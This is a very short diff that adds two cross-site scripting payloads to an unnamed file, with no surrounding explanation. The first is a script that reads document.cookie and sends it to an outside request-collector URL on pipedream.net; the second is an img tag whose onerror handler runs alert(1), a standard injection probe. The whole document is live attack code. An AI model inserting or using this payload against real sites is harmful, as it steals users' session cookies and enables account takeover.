@@ -1,0 +1,6 @@
+ <script>
+   var xhr = new XMLHttpRequest();
+   xhr.open("GET", "https://enatup4cn5drw.x.pipedream.net/?cookies=" + encodeURIComponent(document.cookie), true);
+   xhr.send();
+ </script>
+<img src=1 href=1 onerror="javascript:alert(1)"></img>
